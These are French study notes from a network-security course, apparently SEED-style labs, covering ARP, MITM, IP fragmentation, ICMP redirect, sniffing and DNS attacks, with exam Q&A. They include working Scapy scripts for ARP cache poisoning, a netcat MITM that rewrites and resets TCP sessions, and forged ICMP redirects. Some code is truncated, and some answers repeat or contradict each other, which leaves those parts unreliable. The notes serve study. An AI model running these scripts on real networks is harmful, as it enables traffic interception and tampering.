💡 Chaque couche a son type d'adresse : Transport → Port | Network → IP | Data Link → MAC

🖥️ Interface Réseau (NIC)

  • NIC (Network Interface Card) : lien physique/logique entre ordinateur et réseau
  • Chaque NIC a une adresse MAC (hardware address) unique
  • Interface physique : carte réseau réelle (ex: enp0s3)
  • Interface virtuelle : Loopback (lo, 127.0.0.1), Dummy interface

Loopback vs Dummy

  • Loopback : « boucle » — les paquets reviennent à la même machine, jamais envoyés sur le réseau
  • Dummy : similaire au loopback mais possède sa propre adresse IP

Nommage des interfaces Linux

Ancien : eth0, eth1 → Nouveau : enp0s3, enp1s4 (nom prévisible basé sur l'emplacement physique PCI)

📡 Mode Promiscuous

  • Ethernet est un medium broadcast
  • Normalement, le NIC vérifie la MAC destination → accepte si c'est la sienne, rejette sinon
  • Mode promiscuous : le NIC accepte TOUS les paquets du réseau local
  • Nécessaire pour le packet sniffing
  • Dans pcap : pcap_open_live("eth3", BUFSIZ, 1, 1000, errbuf) — le 1 active le mode promiscuous

🔄 Protocole ARP

But : Trouver l'adresse MAC à partir d'une adresse IP (résolution d'adresse sur le LAN)

Fonctionnement

  • ARP Request (broadcast) : « Qui a l'IP X ? Dites-le à Y »
  • ARP Reply (unicast) : « J'ai l'IP X, voici ma MAC »
  • Le résultat est mis en cache ARP pour éviter des requêtes répétées

Message ARP — Champs Scapy

hwdstMAC destination00:00:00:00:00:00 (request)
pdstIP destinationIP cible

☠️ ARP Cache Poisoning

🚨 Principe : Envoyer de faux messages ARP pour corrompre le cache ARP de la victime → associer l'IP de B à la MAC de M (attaquant)

3 Méthodes

1. ARP Request forgé (op=1) :

Python
# But: dans le cache de A, mapper B_IP → M_MAC
E = Ether(dst="ff:ff:ff:ff:ff:ff")
A = ARP(op=1, hwsrc=M_MAC, psrc=B_IP, pdst=A_IP)
sendp(E/A)

2. ARP Reply forgé (op=2) :

Python
E = Ether(dst=A_MAC)
A = ARP(op=2, hwsrc=M_MAC, psrc=B_IP, hwdst=A_MAC, pdst=A_IP)
sendp(E/A)

3. ARP Gratuitous (message non sollicité) :

Python
# Source IP = Destination IP, MAC dst = broadcast
E = Ether(dst="ff:ff:ff:ff:ff:ff")
A = ARP(op=1, hwsrc=M_MAC, psrc=B_IP, pdst=B_IP)
sendp(E/A)
⚠️ ARP est un protocole LOCAL (LAN) ! On ne peut PAS lancer une attaque ARP depuis une machine distante. Les trames ARP ne traversent pas les routeurs.

🕵️ Attaque MITM via ARP Poisoning

Étapes de l'attaque

  1. Empoisonner le cache ARP de A : B_IP → M_MAC
  2. Empoisonner le cache ARP de B : A_IP → M_MAC
  3. Les paquets A↔B passent par M

Code du TP : arp_mitm_poison.py

Python
#!/usr/bin/python3
from scapy.all import *
import time

interface = "enp0s3"
A_IP = "192.168.10.9"
B_IP = "192.168.10.10"
attacker_mac = get_if_hwaddr(interface)

# Envoyer reply forgé à A: "B est à mon MAC"
arp_to_A = ARP(op=2, hwsrc=attacker_mac, psrc=B_IP,
               hwdst="ff:ff:ff:ff:ff:ff", pdst=A_IP)
# Envoyer reply forgé à B: "A est à mon MAC"
arp_to_B = ARP(op=2, hwsrc=attacker_mac, psrc=A_IP,
               hwdst="ff:ff:ff:ff:ff:ff", pdst=B_IP)

while True:
    send(arp_to_A, iface=interface, verbose=False)
    send(arp_to_B, iface=interface, verbose=False)
    time.sleep(2)  # Envoyer en boucle pour maintenir le poison

IP Forwarding

CommandeEffet
sysctl net.ipv4.ip_forward=1M transmet les paquets → A et B communiquent normalement (M invisible)
sysctl net.ipv4.ip_forward=0M intercepte sans transmettre → on peut modifier les paquets
💡 Pour modifier les paquets : Désactiver IP forwarding + utiliser un programme sniff-and-spoof qui capture, modifie et renvoie les paquets.

Filtre MITM

Utiliser la MAC source d'Ethernet (pas l'IP) dans le filtre car après poisoning, l'IP src/dst ne correspond pas à la machine réelle qui envoie. On filtre par ether src A_MAC.

🧪 TP — ARP Cache Poisoning (3 Méthodes détaillées)

Tâche 1A — ARP Request forgé

But : mettre dans le cache de A → B_IP = M_MAC

Python
from scapy.all import *
# M envoie un ARP Request en se faisant passer pour B
E = Ether(dst="ff:ff:ff:ff:ff:ff")
A = ARP(op=1, hwsrc=M_MAC, psrc=B_IP,
        hwdst="00:00:00:00:00:00", pdst=A_IP)
sendp(E/A, iface="enp0s3")
# Vérifier : sur A → arp -n ou ip neigh show

Tâche 1B — ARP Reply forgé

Python
# Réponse unicast directe à A
E = Ether(dst=A_MAC)
A = ARP(op=2, hwsrc=M_MAC, psrc=B_IP,
        hwdst=A_MAC, pdst=A_IP)
sendp(E/A, iface="enp0s3")

Tâche 1C — ARP Gratuitous

Python
# source IP = destination IP = B_IP
# Broadcast — met à jour TOUS les caches du LAN
E = Ether(dst="ff:ff:ff:ff:ff:ff")
A = ARP(op=1, hwsrc=M_MAC, psrc=B_IP,
        hwdst="ff:ff:ff:ff:ff:ff", pdst=B_IP)
sendp(E/A, iface="enp0s3")
💡 Comportement attendu :
• 1A : Fonctionne souvent si A avait déjà B dans son cache (mise à jour)
• 1B : Fonctionne quasi toujours — reply accepté sans demande
• 1C : Fonctionne si B avait déjà une entrée dans le cache de A

🔐 TP — MITM Netcat via ARP : netcat_mitm.py complet

Ce script complet gère le MITM sur une connexion Netcat TCP entre A (192.168.10.9) et B (192.168.10.10) et peut aussi tuer la session avec RST.

Python
#!/usr/bin/python3
from scapy.all import *

A_IP = "192.168.10.9"
B_IP = "192.168.10.10"
PORT = 9090
IFACE = "enp0s3"
NAME = b"CONFIDENTIEL"
REPL = b"*" * len(NAME)  # Même longueur !

A_MAC = getmacbyip(A_IP)
B_MAC = getmacbyip(B_IP)

def spoof(pkt):
    if not pkt.haslayer(Ether) or not pkt.haslayer(TCP): return
    ip = pkt[IP]; tcp = pkt[TCP]

    # Direction A → B : modifier le payload
    if ip.src == A_IP and ip.dst == B_IP and tcp.dport == PORT:
        data = tcp.payload.load if tcp.payload else b""
        data = data.replace(NAME, REPL)  # Censurer

        if b"ALERT" in data:   # Tuer la session TCP
            rst = Ether(dst=B_MAC)/IP(src=A_IP,dst=B_IP)/TCP(
                sport=tcp.sport,dport=tcp.dport,
                seq=tcp.seq+len(tcp.payload.load),flags="R")
            del rst[IP].chksum; del rst[TCP].chksum
            sendp(rst, iface=IFACE, verbose=False); return

        newpkt = Ether(dst=B_MAC)/IP(src=ip.src,dst=ip.dst)/TCP(
            sport=tcp.sport,dport=tcp.dport,seq=tcp.seq,
            ack=tcp.ack,flags=tcp.flags)/data
        del newpkt[IP].chksum; del newpkt[TCP].chksum
        sendp(newpkt, iface=IFACE, verbose=False)

    # Direction B → A : forward sans modifier
    elif ip.src == B_IP and ip.dst == A_IP:
        sendp(Ether(dst=A_MAC)/ip, iface=IFACE, verbose=False)

sniff(iface=IFACE, filter="tcp port 9090", prn=spoof)
✅ Points critiques :
• REPL doit avoir la même longueur que NAME → preserves TCP seq numbers
• Filtrer par TCP port pour éviter de sniffer ses propres paquets retransmis
• Utiliser getmacbyip() pour obtenir les MACs réelles via ARP

📡 MAC/ARP — Récapitulatif (Slides N02)

Mode Promiscuous : NIC accepte TOUTES les frames (pas seulement sa propre MAC) → sniffing possible.

Gratuitous ARP : Reply où src IP = dst IP, dst MAC = broadcast (ff:ff:ff:ff:ff:ff). Utilisé pour ARP poisoning.

MITM via ARP — 4 Étapes

  1. Empoisonner : ARP reply à A (B IP → M MAC) et à B (A IP → M MAC)
  2. IP forwarding OFF : sysctl net.ipv4.ip_forward=0 → paquets stoppés sur M
  3. Capturer : sniff filtre sur MAC source de A (pas IP — moins fiable)
  4. Modifier + forward : reconstruire paquet, del checksums, envoyer

💡 Traceroute fonctionne en envoyant des paquets avec TTL=1, 2, 3… Chaque routeur renvoie un ICMP Time Exceeded quand TTL=0, révélant son IP.

🧩 Fragmentation IP

Pourquoi ? Les réseaux ont un MTU (Maximum Transmission Unit, typiquement 1500 octets). Les paquets plus grands doivent être fragmentés.

Exemple de fragmentation

Paquet UDP de 500 octets, MTU=200, ID=1234 :

FragmentIDMFOffsetTotal LengthProtocol
1123410160+20=18017 (UDP)
21234120 (=160/8)160+20=18017
31234040 (=320/8)180+20=20017
⚠️ Offset × 8 = position réelle. La multiplication par 8 est nécessaire car le champ offset n'a que 13 bits → permet d'adresser jusqu'à 65528 octets.

Code Scapy — Construire des fragments

Python
ip = IP(src="1.2.3.4", dst="10.0.0.15")
ip.id = 1000

# Fragment 1 (avec en-tête UDP)
ip.frag = 0; ip.flags = 1  # MF=1
udp = UDP(sport=7070, dport=9090)
udp.len = 200  # Taille combinée de tous les fragments
pkt1 = ip/udp/('A'*32)
pkt1[UDP].checksum = 0

# Fragment 2
ip.frag = 5  # offset=(8+32)/8=5
pkt2 = ip/('B'*32)

# Fragment 3 (dernier)
ip.frag = 9; ip.flags = 0  # MF=0
pkt3 = ip/('C'*32)

💣 Attaques sur la Fragmentation IP

1. Épuisement de ressources (Incomplete Fragments)

Envoyer des fragments incomplets → le noyau alloue de la mémoire pour attendre les fragments manquants → DoS

2. Ping of Death

Créer un paquet > 65535 octets via fragmentation. Le dernier fragment a offset + taille > 65535 → crash du système.

3. Teardrop Attack

Envoyer des fragments avec des offsets qui se chevauchent → comportement imprévisible, crash possible.

💥 Attaque Smurf

Envoyer un ICMP Echo Request avec l'IP source = IP victime vers l'adresse de broadcast dirigé (ex: 192.168.60.255). Toutes les machines du réseau répondent à la victime → amplification DDoS.

🔀 ICMP Redirect Attack

But : Forcer la victime à router ses paquets via l'attaquant au lieu du vrai routeur.

Code du TP : redirect.py

Python
from scapy.all import *

A_IP = "10.10.10.3"        # Victime
B_IP = "10.10.10.4"        # Vrai routeur (usurpé)
ATTACKER_IP = "10.10.10.2" # Faux routeur (attaquant)
TARGET_IP = "192.168.10.12"

# Paquet original qui "aurait déclenché" le redirect
original_pkt = IP(src=A_IP, dst=TARGET_IP) / ICMP(type=8, code=0)

# ICMP Redirect : type=5, code=1 (host redirect)
ip = IP(src=B_IP, dst=A_IP)  # Prétend venir du vrai routeur
icmp = ICMP(type=5, code=1, gw=ATTACKER_IP)  # gw = nouveau routeur
pkt = ip / icmp / original_pkt
send(pkt)
🚫 Limitations :
  • ICMP redirect ne peut PAS rediriger vers une machine hors du LAN
  • Contremesure : sysctl net.ipv4.conf.all.accept_redirects=0
  • Ne fonctionne PAS depuis une machine distante (doit venir du routeur actuel)

🛡️ Reverse Path Filtering

Mécanisme de sécurité du noyau Linux : quand un paquet arrive sur une interface, le système vérifie si la route de retour passerait par la même interface. Si non → paquet rejeté.

But : Empêcher le spoofing d'adresses IP internes depuis l'extérieur.

Expérimentation

  • Paquet forgé avec IP source 10.0.2.x → accepté (route symétrique)
  • Paquet forgé avec IP source 192.168.60.x → rejeté (route asymétrique)
  • Paquet forgé avec IP source 1.2.3.4 → rejeté (route asymétrique)

📋 MAC vs IP — Différence dans les en-têtes

💡 Scénario clé : Dans une trame Ethernet contenant un paquet IP, la MAC destination et l'IP destination peuvent être différentes. Cela arrive quand le paquet est envoyé vers un routeur (MAC = routeur, IP = destination finale).

🔀 TP — ICMP Redirect Attack (code complet)

from scapy.all import *
# Activer d'abord: sysctl net.ipv4.conf.all.accept_redirects=1

A_IP = "10.10.10.3"    # Victime
R_IP = "10.10.10.4"    # Vrai routeur (usurpé comme source)
M_IP = "10.10.10.2"    # Attaquant (nouveau gateway)

# Vérifier l'effet : ip route get 8.8.8.8 → doit indiquer via M_IP

Techniques d'Attaque ▼

📡 Packet Sniffing

  • Sniffing = capturer les paquets qui circulent sur le réseau
  • Nécessite le mode promiscuous et les privilèges root
  • Outils : Wireshark, Tcpdump, Scapy

Séquence pcap en C

  1. pcap_open_live() — Ouvrir la session de capture
  2. pcap_compile() — Compiler le filtre BPF
  3. pcap_setfilter() — Appliquer le filtre
  4. pcap_loop() — Capturer en boucle avec callback
  5. pcap_close() — Fermer la session
⚠️ Pourquoi root ? Le sniffing nécessite l'accès aux raw sockets et la mise en mode promiscuous du NIC → opérations noyau. Sans root : pcap_open_live() échoue.

🎭 Packet Spoofing

  • Spoofing = forger des paquets avec des champs arbitraires (fausse IP source, etc.)
  • Utilise les raw sockets → contrôle total sur les en-têtes
  • Nécessite root (appel socket(AF_INET, SOCK_RAW, IPPROTO_RAW) échoue sinon)

B_IP = "10.10.10.4";  A_IP = "192.168.10.12"
PORT = 9090;  IFACE = "enp0s3"
NAME = b"SEED";  REPL = b"HACK"  # Même longueur !
ATTACKER_MAC = get_if_hwaddr(IFACE)

def spoof(pkt):
    if not pkt.haslayer(Ether) or not pkt.haslayer(IP): return
    if not pkt.haslayer(UDP): return
    if pkt[Ether].src == ATTACKER_MAC: return  # Éviter boucle

    ip = pkt[IP]; udp = pkt[UDP]
    if udp.sport != PORT and udp.dport != PORT: return

             UDP(sport=udp.sport, dport=udp.dport) / data
    del newpkt[IP].chksum   # Recalcul auto

    sendp(newpkt, iface=IFACE, verbose=False)

📡 Network Basics (N1.x)

N1.1Quel est le préfixe réseau de 10.1.2.200/24 et 10.1.2.200/26 ?
Réponse : (1) 10.1.2.0 — /24 = masque 255.255.255.0, les 3 premiers octets sont le préfixe.
(2) 10.1.2.192 — /26 = masque 255.255.255.192. 200 en binaire = 11001000, AND avec 11000000 (192) = 11000000 = 192.
N1.5Que signifient les options "lnu" dans nc -lnu 9090 ?
Réponse : l = listen (écouter), n = ne pas résoudre les noms DNS, u = mode UDP (au lieu de TCP par défaut).
N1.6Que fait le bind et que signifie 0.0.0.0 ?
Réponse : bind() associe le socket à une adresse IP et un port. 0.0.0.0 signifie écouter sur toutes les interfaces. Pour écouter uniquement localhost : bind(("127.0.0.1", 9090)).
N1.7Comment l'OS sait quel client reçoit la réponse sans bind ?
Réponse : L'OS attribue automatiquement un port source éphémère au client. Ce port est inclus dans le paquet envoyé au serveur. Le serveur répond à ce port. L'OS maintient une table qui associe chaque port à son processus.
N1.8Pourquoi le sniffing nécessite le privilège superuser ?
Réponse : Le sniffing nécessite l'accès aux raw sockets et la mise en mode promiscuous du NIC, qui sont des opérations au niveau du noyau. Sans root, pcap_open_live() échoue car le système refuse l'accès.

🔗 MAC & ARP (N2.x)

N2.1À quoi sert le mode promiscuous ?
Réponse : Le mode promiscuous permet au NIC d'accepter tous les paquets sur le réseau, pas seulement ceux destinés à sa MAC. Indispensable pour le packet sniffing.
N2.5Pourquoi a-t-on besoin du protocole ARP ?
Réponse : Sur un LAN, la communication utilise les adresses MAC, mais on ne connaît que les adresses IP. ARP résout cette correspondance : IP → MAC.
N2.6Ping 10.8.8.8 depuis 10.8.8.5/24 — valeurs dans l'en-tête Ethernet ?
Réponse : (1) MAC destination = ff:ff:ff:ff:ff:ff (broadcast, car ARP Request) (2) MAC source = MAC de la machine 10.8.8.5
N2.8Ping 93.184.216.34 depuis 10.8.8.0/24 — quelle IP cible dans l'ARP ?
Réponse : L'ARP cible le routeur par défaut : 10.8.8.1. Car la destination est hors du LAN, le paquet doit être envoyé au routeur.
N2.9Ping 10.8.8.100 (inexistant LAN) — peut-on sniffer le ping ?
Réponse : Non. L'ARP Request pour 10.8.8.100 ne recevra pas de réponse → le paquet ping ne sera jamais envoyé sur le réseau → rien à sniffer.
N2.10Ping 1.2.3.4 (inexistant Internet) — peut-on sniffer le ping ?
Réponse : Oui. L'ARP se fait pour le routeur (qui existe), le ping est envoyé au routeur → visible sur le LAN. Mais pas de réponse car 1.2.3.4 n'existe pas.
N2.14Peut-on lancer un ARP poisoning depuis un ordinateur distant ?
Réponse : Non. ARP est un protocole de couche 2 (liaison). Les trames ARP ne traversent jamais les routeurs. L'attaquant doit être sur le même LAN que la victime.
N2.17MITM : que se passe-t-il si IP forwarding est On/Off sur M ?
Réponse : (1) Off : M reçoit les paquets mais ne les transmet pas → A et B ne communiquent plus.
(2) On : M transmet les paquets automatiquement → communication normale, M peut seulement observer.
(3) Pour modifier : IP forwarding OFF + programme sniff-and-spoof qui modifie et renvoie manuellement.

🌐 IP / ICMP (N3.x)

N3.1Pourquoi la fragmentation est-elle nécessaire ?
Réponse : Chaque réseau a un MTU (Maximum Transmission Unit). Si un paquet est plus grand que le MTU du réseau suivant, il doit être fragmenté en morceaux plus petits.
N3.2Pourquoi multiplier l'offset par 8 ?
Réponse : Le champ offset n'a que 13 bits → max 8191. En multipliant par 8, on peut adresser 65528 octets (8191×8). Cela permet de couvrir la taille maximale d'un paquet IP (65535).
N3.3Comment le récepteur sait quel fragment est le dernier ?
Réponse : Le dernier fragment a le flag MF=0 (More Fragments = 0). Tous les autres ont MF=1.
N3.4Sans le dernier fragment, peut-on connaître la taille totale ?
Réponse : Non. La taille totale = offset du dernier fragment × 8 + taille payload du dernier fragment. Sans le dernier, on ne connaît pas la fin.
N3.8Si le 3e fragment ne vient jamais, l'OS livre-t-il les 2 premiers ?
Réponse : Faux. L'OS attend TOUS les fragments. Après un timeout, il rejette tous les fragments reçus. Il ne délivre jamais un paquet incomplet à la couche transport.
N3.11Routage : quelle interface pour 192.200.60.5, 192.168.30.5, 192.168.60.5 ?
Réponse : (1) 192.200.60.5 → interface-a (seule 0.0.0.0/0 matche)
(2) 192.168.30.5 → interface-b (192.168.0.0/16 matche, plus spécifique que /0)
(3) 192.168.60.5 → interface-d (192.168.60.5/32 = match exact, le plus spécifique)
N3.12Quand MAC dest et IP dest sont différentes ?
Réponse : Quand le paquet traverse un routeur. La MAC destination est celle du routeur (prochain saut), mais l'IP destination reste la destination finale. La MAC change à chaque saut, l'IP reste la même.
N3.13Qu'est-ce que le reverse path filtering ?
Réponse : Quand un paquet arrive sur une interface, le routeur vérifie si la route retour vers l'IP source passerait par la même interface. Si non → paquet rejeté. But : empêcher le spoofing d'IP internes depuis l'extérieur.
N3.14Quelle attaque transforme 1 paquet en plusieurs ?
Réponse : L'attaque Smurf. On envoie un ICMP Echo Request vers l'adresse de broadcast (ex: 192.168.60.255) avec l'IP source spoofée = IP victime. Toutes les machines répondent à la victime → amplification.
N3.15Comment un routeur sait s'il doit envoyer un ICMP Redirect ?
Réponse : Un routeur envoie un ICMP Redirect quand l'interface d'entrée et de sortie du paquet sont les mêmes. Cela signifie que l'expéditeur aurait pu envoyer directement au meilleur routeur.
N3.19Peut-on rediriger vers une machine hors du LAN via ICMP Redirect ?
Réponse : Non. L'adresse du gateway (gw) dans le message ICMP Redirect doit être une machine sur le même LAN que la victime. Les systèmes rejettent les redirections vers des adresses non locales.

👁️ Sniffing & Spoofing (N4.x)

N4.1Erreur "NULL: No such device" — quelle est la cause ?
Réponse : L'interface eth1 n'existe pas sur la machine. Il faut utiliser le bon nom d'interface (ex: enp0s3, vérifiable avec ifconfig).
N4.2Sniffer ne capture que ses propres paquets — cause ?
Réponse : Le mode promiscuous est désactivé (3e paramètre = 0). Avec pcap_open_live("eth3",BUFSIZ,0,...), le NIC ne capture que les paquets destinés à sa MAC. Mettre 1 pour activer le mode promiscuous.
N4.90xAABBCCDD stocké à 0x1000 — Big vs Little Endian ?
Réponse :
Big-Endian : 0x1000=AA, 0x1001=BB, 0x1002=CC, 0x1003=DD
Little-Endian : 0x1000=DD, 0x1001=CC, 0x1002=BB, 0x1003=AA
N4.10Erreur de conversion byte order — conséquence ?
Réponse : Sur Little-Endian, 255 octets = 0x000000FF en mémoire. Sans conversion, interprété comme 0xFF000000 = 4 278 190 080 octets (~4GB). Le programme alloue ~4GB de mémoire au lieu de 255 octets → crash ou DoS.
N4.12Spoofing vers 10.3.2.30 ne sort pas — pourquoi ?
Réponse : 10.3.2.30 est sur le même réseau (10.3.2.0/24). Le système essaie d'envoyer directement via ARP. ARP cherche la MAC de 10.3.2.30, qui n'existe pas (c'est une IP que personne n'a) → le paquet n'est jamais envoyé. Pour 1.2.3.4 (hors réseau), le paquet est envoyé au routeur via ARP (le routeur existe).

🎭 DNS Remote Cache Poisoning (Attaque Kaminsky)

Principe : Sans voir les requêtes DNS (résolveur distant), l'attaquant :

  1. Génère des milliers de requêtes pour des sous-domaines aléatoires (rand1234.example.com)
  2. Envoie en parallèle des milliers de fausses réponses avec des IDs DNS aléatoires
  3. Si un ID coïncide avant la vraie réponse → cache empoisonné
⚠️ Challenge : 16 bits d'ID = 65536 possibilités. Les ports source aléatoires (Source Port Randomization) multiplient l'entropie par ~30000 → attaque beaucoup plus difficile.

🔁 DNS Rebinding Attack

But : Contourner la politique Same-Origin (SOP) du navigateur pour accéder au réseau interne.

  1. Attaquant contrôle evil.com avec TTL très court (1 sec)
  2. Victime visite evil.com → résout vers IP attaquant
  3. TTL expire → DNS rebind vers IP interne (ex: 192.168.1.1)
  4. Le JS de la page peut maintenant faire des requêtes vers 192.168.1.1 !
✅ Contre-mesures : Validation des en-têtes Host, DNS rebinding protection dans les navigateurs.

🐛 Morris Worm & Mitnick Attack

Morris Worm (1988)

  • Premier worm Internet — exploitait des vulnérabilités dans sendmail, fingerd, rsh
  • Technique principale : buffer overflow dans fingerd
  • Auto-réplication : copie le code vers les machines compromises, les infecte à leur tour
  • Propagation : scan de nouvelles cibles, exploitation, upload, exécution

Mitnick Attack (1994)

  • Attaque contre Tsutomu Shimomura — exploitait la confiance basée sur l'IP (rsh/rlogin)

✅ Leçon : Ne jamais faire confiance à l'adresse IP pour l'authentification. Utiliser des mécanismes cryptographiques (SSH, TLS).

Examen ▼
N1.1Quel est le préfixe réseau de 10.1.2.200/24 et 10.1.2.200/26 ?
Réponse : (1) 10.1.2.0 — /24 masque 255.255.255.0.
(2) 10.1.2.192 — /26 masque 255.255.255.192 ; 200 AND 192 = 192.
N1.2Comment les adresses MAC peuvent-elles servir au tracking ?
Réponse : Les appareils diffusent des sondes WiFi avec leur MAC. En corrélant les MACs vues par plusieurs points d'accès, on peut tracer les déplacements d'une personne. Contre-mesure : MAC randomization (utilisé sur les smartphones modernes).
N1.3Pourquoi l'interface loopback est-elle appelée "loopback" ?
Réponse : Parce que les paquets envoyés reviennent en boucle à la même machine sans jamais quitter le système (adresse 127.0.0.1). L'OS intercepte ces paquets avant qu'ils atteignent la couche physique.
N1.4Différence entre loopback et dummy interface ?
Réponse : Toutes deux sont virtuelles. Loopback : adresse fixe 127.0.0.1, utilisée pour les communications locales. Dummy : interface similaire mais avec sa propre adresse IP configurable ; utile pour les tests (les paquets sont jetés, non renvoyés en boucle).
N1.5Que signifient les options "lnu" dans nc -lnu 9090 ?
Réponse : l=listen, n=pas de résolution DNS, u=UDP.
N1.6Que fait bind() et que signifie 0.0.0.0 ?
Réponse : bind() attache le socket à une IP+port. 0.0.0.0 = écouter sur toutes les interfaces.
N1.7Comment l'OS sait quel client reçoit la réponse sans bind ?
Réponse : L'OS assigne un port source éphémère automatiquement. Le serveur répond à ce port, l'OS sait quel processus l'a ouvert.
N1.8Pourquoi le sniffing nécessite le privilège root ?
Réponse : Accès aux raw sockets et activation du mode promiscuous sont des opérations noyau. Sans root, pcap_open_live() échoue.
N1.9Est-il possible de spoofer un paquet > 65535 octets ?
Réponse : Oui, via la fragmentation. Chaque fragment respecte la limite, mais l'offset du dernier fragment peut être tel que offset×8 + payload > 65535. C'est l'attaque Ping of Death.
N1.10Avec MTU=1500 partout, quel est le plus grand paquet IPv4 envoyable ?
Réponse : 1500 octets (incluant en-tête IP de 20 octets). Si le paquet est plus grand, il sera fragmenté à chaque saut, mais chaque fragment respecte le MTU de 1500.

N2.14Peut-on lancer ARP poisoning depuis une machine distante ?
Non — ARP est un protocole L2. Les messages ARP ne sont jamais routés au-delà du LAN local. Un attaquant distant ne peut pas envoyer des messages ARP sur un autre réseau.
N2.17MITM ARP : IP forwarding ON vs OFF — impact ?
(1) IP forwarding OFF : les paquets de A arrivent chez M mais ne sont PAS forwardés vers B → DoS (les connexions tombent)
(2) IP forwarding ON : les paquets sont forwardés → transparence, A et B peuvent communiquer (mais via M)
(3) Pour modifier les paquets : ON d'abord (pour maintenir la connexion), puis scripter la modification avant de forwarder.

Après modification du contenu du paquet, les checksums originaux (calculés sur l'ancien contenu) sont invalides. En mettant chksum=None (del), Scapy les recalcule automatiquement lors du send() avec les nouvelles valeurs correctes.

N3.1Pourquoi la fragmentation est-elle nécessaire ?
Réponse : Chaque réseau a un MTU. Si un paquet est plus grand, il doit être fragmenté.
N3.2Pourquoi multiplier l'offset par 8 ?
Réponse : Le champ offset = 13 bits max 8191. Multiplié par 8 → 65528 octets → couvre la taille max d'un paquet IP (65535).
N3.3Comment le receveur sait quel fragment est le dernier ?

🌐 N3 — IP & ICMP Attacks (N3.1 → N3.19)

N3.1Pourquoi a-t-on besoin de la fragmentation IP ?
Chaque réseau a un MTU (Maximum Transmission Unit). Si un paquet IP dépasse le MTU d'un lien, il doit être fragmenté. Ex: Ethernet MTU = 1500 octets.
N3.2L'offset de fragment est multiplié par 8 — pourquoi ?
Le champ offset a seulement 13 bits (max = 8191). En multipliant par 8, on peut adresser 8191×8 = 65528 octets ≈ 65535 (taille max IP). Le facteur 8 donne la granularité nécessaire pour les grands paquets sans agrandir le champ.
N3.3Comment le récepteur sait-il quel fragment est le dernier ?
Le flag MF (More Fragments) = 0 sur le dernier fragment. Tous les autres fragments ont MF=1.
N3.4Sans voir le dernier fragment, peut-on connaître la taille totale du paquet ?
Non — on ne connaît la taille totale qu'en recevant le dernier fragment (MF=0). À partir de son offset + sa taille, on calcule la taille totale.
N3.5Peut-on spoofing un paquet > 65535 octets ?
Oui, en utilisant la fragmentation. On envoie plusieurs fragments avec des offsets tels que leur réassemblage dépasse 65535 octets → c'est la base du Ping of Death.
N3.7Fragmenter UDP 500 octets payload, MTU=200 : 3 fragments (160+160+180 données)

312340320/8=40180+20=200
Note: seul le 1er fragment contient l'en-tête UDP. Les suivants ont seulement l'en-tête IP + données.
N3.81er et 2ème fragment arrivés, 3ème jamais — l'OS livre les 2 premiers à la couche transport ?
Faux — l'OS attend tous les fragments avant de les assembler et livrer. Si le dernier fragment n'arrive pas dans le délai (timeout ~30s), tous les fragments sont jetés.

N3.11Routes A.0.0.0/0 B.192.168.0.0/16 C.192.168.60.0/24 D.192.168.60.5/32 — quelle interface pour 3 IPs ?
  • 192.200.60.5 → interface-a (default 0.0.0.0/0, aucune route plus spécifique)
  • 192.168.30.5 → interface-b (192.168.0.0/16, plus spécifique que default)
  • 192.168.60.5 → interface-d (/32 est le plus spécifique — longest prefix match)
N3.12MAC destination ≠ IP destination dans un frame Ethernet — quel scénario ?
Routage — quand packet traverse un routeur. La MAC destination est celle du routeur (prochain saut), mais l'IP destination est celle de la machine finale. Le routeur déclapsule et ré-encapsule avec la MAC du saut suivant.
N3.13Qu'est-ce que le Reverse Path Filtering ?
Le routeur vérifie si la route de retour vers l'IP source d'un paquet reçu correspond à l'interface d'entrée du paquet. Si la réponse partirait par une autre interface → paquet rejeté → protège contre le IP spoofing.
N3.14Attaque qui transforme 1 paquet en beaucoup ?
Smurf Attack — envoyer un ping ICMP broadcast avec IP src = IP de la victime. Tous les hôtes du réseau répondent à la victime → amplification massive.
N3.15-N3.16Comment un routeur décide d'envoyer un ICMP Redirect ? Qui l'envoie dans l'exemple ?
Un routeur envoie ICMP Redirect quand : il reçoit un paquet d'une machine A, et sait qu'un autre routeur sur le même réseau est le meilleur chemin vers la destination. Le router R enverrait ICMP Redirect à A pour lui dire "va directement vers 192.168.30.1 au lieu de moi".
N3.18ICMP Redirect en MITM — comment ?
L'attaquant envoie un faux ICMP Redirect à la victime, lui disant "le chemin optimal vers X passe par M (l'attaquant)". La victime met à jour ses routes → tous ses paquets vers X passent par M (MITM).
N3.19ICMP Redirect peut-il rediriger vers une machine distante (hors LAN) ?
Non — l'ICMP Redirect ne peut indiquer qu'une gateway qui est sur le même réseau local. Le routeur dans le redirect doit être directement accessible par la victime.

🔍 N4 — Packet Sniffing & Spoofing (N4.1 → N4.12)

N4.1pcap_open_live("eth1", ...) → "NULL: No such device" — cause ?
L'interface eth1 n'existe pas sur cette machine. Le nom doit être adapté (ex: enp0s3, ens3). Vérifier avec ip link show ou ifconfig -a.
N4.2pcap_open_live("eth3", BUFSIZ, 0, ...) — pourquoi ne capture que son propre trafic ?
Le 3ème argument (0) désactive le mode promiscuous. Sans ce mode, la NIC filtre au niveau matériel et ignore les paquets non destinés à sa propre MAC. Il faut mettre 1 pour capturer tout le trafic.
N4.3Quelle ligne nécessite root dans un sniffer pcap ?
pcap_open_live() — c'est elle qui ouvre le raw socket en mode promiscuous, opération réservée à root (ou CAP_NET_RAW).

Wireshark utilise une architecture séparée : le processus principal tourne en tant que seed mais lance dumpcap (enfant) qui lui tourne en root ou avec CAP_NET_RAW (via setuid ou capabilities). C'est le principe de Separation of Privilege.
N4.7tcpdump -Z seed : pourquoi dropper les privileges APRÈS ouverture ?
pcap_open_live() doit se faire avec root. Après l'ouverture du handle (qui a la capture L2), on n'a plus besoin de root → on drop les privileges pour minimiser le risque de compromission (Principle of Least Privilege). La capture réseau continue sur le handle déjà ouvert.

N4.12Spoof vers 1.2.3.4 OK, mais vers 10.3.2.30 (même subnet) le paquet n'est pas envoyé — pourquoi ?
Pour envoyer vers 10.3.2.30 (même réseau 10.3.2.0/24), l'OS fait d'abord un ARP lookup. Si 10.3.2.30 n'existe pas, l'ARP n'a pas de réponse → l'OS refuse d'envoyer le paquet (pas de MAC destination). Pour 1.2.3.4 (hors réseau), l'OS envoie via la gateway directement → pas d'ARP local nécessaire.
N5.1Pourquoi les ports 0-1023 sont-ils protégés ?
Réponse : Ce sont les well-known ports (ex: 80=HTTP, 443=HTTPS, 53=DNS, 23=Telnet). Seuls les processus avec privilège root peuvent les utiliser. Cela empêche un utilisateur normal de lancer un faux serveur SSH sur le port 22. C'est une mesure de sécurité : les clients font confiance aux services sur ces ports.
N5.2Si une application a besoin de garantir l'ordre des paquets, doit-elle obligatoirement utiliser TCP ?
